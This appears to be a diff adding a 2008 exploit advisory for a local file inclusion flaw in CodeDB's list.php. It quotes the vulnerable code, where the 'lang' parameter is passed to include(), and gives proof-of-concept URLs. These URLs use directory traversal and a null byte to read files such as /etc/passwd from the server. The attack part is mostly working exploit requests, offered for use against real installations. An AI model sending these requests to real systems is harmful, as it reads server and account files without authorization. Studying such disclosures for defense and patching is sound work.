@@ -1,0 +1,28 @@
+###############################################################################
+#
+#   Name    :   CodeDB (list.php lang) Local File Inclusion Vulnerability
+#   Author  :   cOndemned
+#   Greetz  :   ZaBeaTy, str0ke, irk4z, GregStar, doctor, Adish, Avantura ;*
+#
+###############################################################################
+
+Source :
+
+    // list.php
+    
+    2.  $lang = htmlspecialchars($_GET['lang']);            // ok, but.... for what ? lol
+    
+    7.  if(file_exists('templates/'.$lang.'_middle.php'))   // We'll have to cut off rest of filename & extension
+	8.      include('templates/'.$lang.'_middle.php');      // Ekhm... pwned ;d
+    
+    
+Proof of Concept :
+
+    http://[host]/[codeDB_path]/list.php?lang=../readme.txt%00
+    http://[host]/[codeDB_path]/list.php?lang=../../../../etc/passwd%00
+    http://[host]/[codeDB_path]/list.php?lang=../[local_file]%00
+
+    
+EoF.   
+
+# milw0rm.com [2008-07-14]
